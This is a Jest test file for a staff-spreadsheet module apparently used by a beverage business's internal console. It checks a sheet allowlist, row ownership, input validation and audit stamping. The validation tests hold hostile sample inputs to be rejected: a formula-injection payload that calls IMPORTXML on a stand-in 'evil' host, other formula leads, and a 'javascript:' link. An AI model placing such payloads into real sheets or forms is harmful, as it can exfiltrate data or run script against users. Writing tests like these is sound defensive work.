// The schema describes sheets the console creates for itself, and it is the
// security boundary: it is an allowlist, so no request can name an existing
// sheet however it is formed. Google enforces the same thing independently via
// the `drive.file` grant — this is the belt to that pair of braces.

const {
  listSheets, getSchema, headerFor, widthOf, editableFields,
  parseRecords, validate, toRowValues, canEdit,
} = require('./staffSheets');

const RISHAV = { name: 'Rishav', email: 'rishav@blendnbubbles.com' };
const ARPAN = { name: 'Arpan', email: 'arpan@blendnbubbles.com' };
const NOW = '2026-08-11T09:00:00.000Z';

describe('the allowlist', () => {
  it('exposes exactly the five sheets the console creates', () => {
    expect(listSheets().map((s) => s.id).sort()).toEqual([
      'staff-attendance', 'staff-drinks', 'staff-experiments', 'staff-fest-list', 'staff-tasks',
    ]);
  });

  it('names no existing sheet as a write target', () => {
    // seedFrom is a read source, deliberately separate from the write target.
    const titles = listSheets().map((s) => s.title.toLowerCase());
    for (const original of [
      'customer details dec-april', 'daily_sales_record_tracker_2025',
      'bnb event requests', 'needed for fest', 'attendance tracker 2026',
      'marketing & content project tracker 2026',
    ]) {
      expect(titles).not.toContain(original);
    }
  });

  it('every target title is namespaced so it cannot collide with a real sheet', () => {
    expect(listSheets().every((s) => s.title.startsWith('BnB Staff —'))).toBe(true);
  });

  it('refuses unknown, empty and prototype ids', () => {
    for (const id of ['customer-details', 'marketing-tracker', '', undefined, '__proto__', 'constructor']) {
      expect(getSchema(id)).toBeNull();
    }
  });

  it('puts the header on row 0 everywhere — we build these, so there is no archaeology', () => {
    expect(listSheets().every((s) => getSchema(s.id).headerRow === 0)).toBe(true);
  });

  it('gives every sheet the same audit spine', () => {
    for (const { id } of listSheets()) {
      const keys = getSchema(id).fields.map((f) => f.key);
      expect(keys).toEqual(expect.arrayContaining(['rowId', 'addedBy', 'addedAt', 'updatedBy', 'updatedAt']));
    }
  });

  it('assigns every field a distinct column', () => {
    for (const { id } of listSheets()) {
      const indexes = getSchema(id).fields.map((f) => f.index);
      expect(new Set(indexes).size).toBe(indexes.length);
    }
  });
});

describe('headerFor', () => {
  it('builds the header row the sheet is created with', () => {
    expect(headerFor(getSchema('staff-attendance')))
      .toEqual(['Row Id', 'Employee', 'Date', 'Status', 'Note',
        'Added By', 'Added At', 'Updated By', 'Updated At']);
  });

  it('matches the declared width', () => {
    for (const { id } of listSheets()) {
      const schema = getSchema(id);
      expect(headerFor(schema)).toHaveLength(widthOf(schema));
    }
  });

  it('leaves audit and identity columns out of what a person may send', () => {
    const keys = editableFields(getSchema('staff-tasks')).map((f) => f.key);
    expect(keys).not.toContain('rowId');
    expect(keys).not.toContain('addedBy');
    expect(keys).not.toContain('updatedAt');
    expect(keys).toContain('taskName');
  });
});

describe('parseRecords', () => {
  const schema = getSchema('staff-tasks');
  const rows = [
    headerFor(schema),
    ['r1', 'Marketing', 'penalty kick campaign', 'shoot', '2026-06-27', '2026-06-01',
     '1', 'Not Started', '', '', '', 'Rishav', NOW, 'Rishav', NOW],
    ['r2', 'Content', 'leaflets', '', '', '2026-06-16', '5', 'Completed'],
  ];

  it('reads values back by field key', () => {
    const [first] = parseRecords(schema, rows);
    expect(first.values.taskName).toBe('penalty kick campaign');
    expect(first.values.addedBy).toBe('Rishav');
  });

  it('pads a ragged row rather than shearing it', () => {
    const [, second] = parseRecords(schema, rows);
    expect(second.values.updatedAt).toBe('');
    expect(second.values.status).toBe('Completed');
  });

  it('numbers rows as the Sheets API does', () => {
    expect(parseRecords(schema, rows).map((r) => r.rowNumber)).toEqual([2, 3]);
  });

  it('skips blank rows and survives missing input', () => {
    expect(parseRecords(schema, [headerFor(schema), [], ['', '']])).toEqual([]);
    expect(parseRecords(schema, [])).toEqual([]);
    expect(parseRecords(schema, null)).toEqual([]);
  });
});

describe('ownership', () => {
  const tasks = getSchema('staff-tasks');

  it('lets a person edit what they added', () => {
    const rec = { values: { addedBy: 'Rishav' } };
    expect(canEdit(tasks, rec, RISHAV)).toBe(true);
    expect(canEdit(tasks, rec, ARPAN)).toBe(false);
  });

  it('ignores case and stray whitespace', () => {
    expect(canEdit(tasks, { values: { addedBy: '  rishav ' } }, RISHAV)).toBe(true);
  });

  it('refuses an unowned row rather than letting anyone claim it', () => {
    expect(canEdit(tasks, { values: { addedBy: '' } }, RISHAV)).toBe(false);
  });

  it('refuses with no signed-in user', () => {
    expect(canEdit(tasks, { values: { addedBy: 'Rishav' } }, null)).toBe(false);
    expect(canEdit(tasks, { values: { addedBy: 'Rishav' } }, {})).toBe(false);
  });

  it('scopes attendance by the employee, not by who typed it', () => {
    const att = getSchema('staff-attendance');
    expect(canEdit(att, { values: { employee: 'Rishav', addedBy: 'Arpan' } }, RISHAV)).toBe(true);
    expect(canEdit(att, { values: { employee: 'Arpan', addedBy: 'Rishav' } }, RISHAV)).toBe(false);
  });
});

describe('validate', () => {
  const schema = getSchema('staff-tasks');
  const good = {
    department: 'Marketing', taskName: 'Durga Puja promo',
    startDate: '2026-08-11', dueDate: '2026-10-26', priority: '2', status: 'Not Started',
  };

  it('accepts a complete record', () => {
    expect(validate(schema, good)).toEqual({ valid: true, errors: {} });
  });

  it('accepts the values the live sheets actually use', () => {
    expect(validate(schema, { ...good, department: 'Content', priority: '5', status: 'Completed' }).valid).toBe(true);
    expect(validate(schema, { ...good, department: 'TBD' }).valid).toBe(true);
  });

  it('names every missing required field at once', () => {
    const { errors } = validate(schema, { ...good, taskName: '  ', dueDate: '' });
    expect(Object.keys(errors).sort()).toEqual(['dueDate', 'taskName']);
  });

  it('rejects a due date before the start date', () => {
    expect(validate(schema, { ...good, startDate: '2026-06-27', dueDate: '2026-06-01' }).errors.dueDate)
      .toMatch(/start/i);
  });

  it('rejects an impossible date instead of rolling it over', () => {
    expect(validate(schema, { ...good, dueDate: '2026-13-45' }).errors.dueDate).toBeTruthy();
    expect(validate(schema, { ...good, dueDate: 'next tuesday' }).errors.dueDate).toBeTruthy();
  });

  it('rejects an option outside the list', () => {
    expect(validate(schema, { ...good, status: 'Nearly done' }).errors.status).toBeTruthy();
    expect(validate(schema, { ...good, priority: '9' }).errors.priority).toBeTruthy();
  });

  it('refuses a formula lead — Sheets would evaluate it', () => {
    for (const payload of ['=IMPORTXML("http://evil","//a")', '+1+1', '-2+3', '@SUM(A1)']) {
      expect(validate(schema, { ...good, taskName: payload }).errors.taskName).toMatch(/formula/i);
    }
  });

  it('leaves ordinary punctuation alone', () => {
    expect(validate(schema, { ...good, taskName: 'Buy-one-get-one' }).valid).toBe(true);
    expect(validate(schema, { ...good, taskName: 'Matcha + oat' }).valid).toBe(true);
  });

  it('caps a paste', () => {
    expect(validate(schema, { ...good, taskName: 'x'.repeat(500) }).errors.taskName).toMatch(/long/i);
  });

  it('rejects a non-http link', () => {
    expect(validate(schema, { ...good, attachmentLink: 'javascript:alert(1)' }).errors.attachmentLink).toBeTruthy();
  });

  it('allowIncomplete relaxes required and ordering but nothing that is a safety rule', () => {
    const legacy = { department: 'TBD', taskName: 'stall banner' };
    expect(validate(schema, legacy, { allowIncomplete: true }).valid).toBe(true);
    expect(validate(schema, legacy).errors.dueDate).toMatch(/required/i);

    const opts = { allowIncomplete: true };
    expect(validate(schema, { taskName: '=HYPERLINK("x","y")' }, opts).errors.taskName).toMatch(/formula/i);
    expect(validate(schema, { taskName: 'x', status: 'Nearly' }, opts).errors.status).toBeTruthy();
    expect(validate(schema, { taskName: 'x', dueDate: '2026-13-45' }, opts).errors.dueDate).toBeTruthy();
  });
});

describe('toRowValues', () => {
  const schema = getSchema('staff-tasks');
  const meta = { user: RISHAV, now: NOW, rowId: 'row-abc' };

  it('positions each value at its declared column', () => {
    const row = toRowValues(schema, { department: 'Marketing', taskName: 'promo' }, null, meta);
    expect(row[1]).toBe('Marketing');
    expect(row[2]).toBe('promo');
  });

  it('stamps identity and audit from the session, never the payload', () => {
    const row = toRowValues(schema, {
      taskName: 'promo', rowId: 'forged', addedBy: 'Arpan', updatedBy: 'Arpan', addedAt: '1999-01-01',
    }, null, meta);
    expect(row[0]).toBe('row-abc');
    expect(row[11]).toBe('Rishav');
    expect(row[12]).toBe(NOW);
    expect(row[13]).toBe('Rishav');
  });

  it('does not re-stamp addedBy when editing an existing row', () => {
    const existing = toRowValues(schema, { taskName: 'promo' }, null, { user: ARPAN, now: NOW, rowId: 'r9' });
    const edited = toRowValues(schema, { taskName: 'renamed' }, existing, meta);
    expect(edited[0]).toBe('r9');
    expect(edited[11]).toBe('Arpan');
    expect(edited[13]).toBe('Rishav');
  });

  it('preserves columns the schema does not map', () => {
    const existing = Array.from({ length: 20 }, (_, i) => `keep${i}`);
    const row = toRowValues(schema, { taskName: 'renamed' }, existing, meta);
    expect(row[19]).toBe('keep19');
    expect(row[2]).toBe('renamed');
  });

  it('sets the attendance employee from the session, so nobody marks someone else present', () => {
    const att = getSchema('staff-attendance');
    const row = toRowValues(att, { employee: 'Arpan', date: '2026-05-01', status: 'Present' }, null, meta);
    expect(row[1]).toBe('Rishav');
  });

  it('emits at least the full sheet width', () => {
    expect(toRowValues(schema, { taskName: 'x' }, null, meta).length).toBeGreaterThanOrEqual(widthOf(schema));
  });
});
